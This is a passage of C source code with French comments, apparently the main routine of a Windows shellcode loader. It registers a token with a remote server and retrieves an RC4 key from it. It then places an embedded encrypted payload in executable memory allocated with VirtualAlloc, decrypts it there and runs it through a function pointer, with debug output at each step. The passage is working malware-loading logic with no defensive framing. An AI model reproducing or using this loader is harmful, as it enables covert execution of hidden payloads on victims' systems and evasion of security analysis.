        DEBUG_PRINT("[!] Erreur lors de l'enregistrement du token\n");
        return 1;
    }

    // Récupérer la clé de déchiffrement
    char decryption_key[1024];
    if (!get_decryption_key(SERVER_URL, TOKEN, signature_hex, decryption_key, sizeof(decryption_key))) {
        DEBUG_PRINT("[!] Erreur lors de la recuperation de la cle de dechiffrement\n");
        return 1;
    }

    // Afficher la taille de la charge utile
    DEBUG_PRINT("Taille de la charge utile: %zu bytes\n", sizeof(encrypted_payload));
    
    // Afficher les premiers octets chiffrés
    DEBUG_PRINT("Premiers octets chiffres: ");
    for (size_t i = 0; i < 16 && i < sizeof(encrypted_payload); i++) {
        DEBUG_PRINT("%02X ", encrypted_payload[i]);
    }
    DEBUG_PRINT("\n");

    // Allouer de la mémoire exécutable pour la charge utile
    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(encrypted_payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        DEBUG_PRINT("Erreur: Impossible d'allouer la memoire executable (code: %lu)\n", GetLastError());
        return 1;
    }
    DEBUG_PRINT("Memoire executable allouee a l'adresse: %p\n", exec_mem);
    
    // Copier la charge utile chiffrée dans la mémoire exécutable
    memcpy(exec_mem, encrypted_payload, sizeof(encrypted_payload));
    DEBUG_PRINT("Charge utile copiee en memoire\n");
    
    // Décoder la clé de déchiffrement depuis base64
    DEBUG_PRINT("Cle de dechiffrement (base64): %s\n", decryption_key);
    
    unsigned char decoded_key[256];
    size_t key_len = 0;
    if (base64_decode(decryption_key, decoded_key, &key_len) != 0) {
        DEBUG_PRINT("Erreur: Impossible de decoder la cle base64\n");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }
    DEBUG_PRINT("Cle dechiffree (longueur: %zu bytes): ", key_len);
    for (size_t i = 0; i < 16 && i < key_len; i++) {
        DEBUG_PRINT("%02X ", decoded_key[i]);
    }
    DEBUG_PRINT("\n");
    
    // Déchiffrer avec RC4
    rc4_decrypt(exec_mem, sizeof(encrypted_payload), decoded_key, key_len);
    
    // Afficher les premiers octets déchiffrés pour vérification
    DEBUG_PRINT("Premiers octets dechiffres: ");
    for (size_t i = 0; i < 16 && i < sizeof(encrypted_payload); i++) {
        DEBUG_PRINT("%02X ", ((unsigned char*)exec_mem)[i]);
    }
    DEBUG_PRINT("\n");

    // Vérifier les permissions de la mémoire
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(exec_mem, &mbi, sizeof(mbi))) {
        DEBUG_PRINT("Permissions de la memoire:\n");
        DEBUG_PRINT("- Protect: 0x%lx\n", mbi.Protect);
        DEBUG_PRINT("- State: 0x%lx\n", mbi.State);
        DEBUG_PRINT("- Type: 0x%lx\n", mbi.Type);
    }

    DEBUG_PRINT("Tentative d'execution de la charge utile...\n");
    fflush(stdout);

    // Exécuter la charge utile déchiffrée
    ((void(*)())exec_mem)();
    
    DEBUG_PRINT("Retour de l'execution\n");
    
    // Nettoyer
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
} 